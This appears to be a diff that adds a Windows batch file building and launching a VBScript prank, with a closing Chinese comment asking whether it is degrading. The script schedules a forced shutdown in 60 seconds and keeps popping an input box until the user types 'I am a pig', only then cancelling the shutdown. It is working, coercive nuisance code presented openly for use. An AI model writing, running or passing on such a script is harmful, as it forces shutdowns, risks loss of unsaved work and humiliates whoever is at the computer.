@@ -1,0 +1,13 @@
+10
+del /f /q "C:\heihei.vbs"
+echo Dim^ ws >>C:/heihei.vbs
+echo set^ ws^=createobject^(^"wscript^.shell^"^) >>C:/heihei.vbs
+echo ws^.run^ ^"shutdown^ ^-s^ ^-t^ 60^" >>C:/heihei.vbs
+echo do^ while^ a^<^>^"我是猪^" >>C:/heihei.vbs
+echo a^=inputbox^(^"快在下面的框框里输入我是猪,否则后果自负，快输""我是猪"" ","输不输^"^"^ ^"^,^"^"^) >>C:/heihei.vbs
+echo loop >>C:/heihei.vbs
+echo ws^.run^ ^"shutdown^ ^-a^" >>C:/heihei.vbs
+start c:/heihei.vbs
+exit
+
+//有损人格？
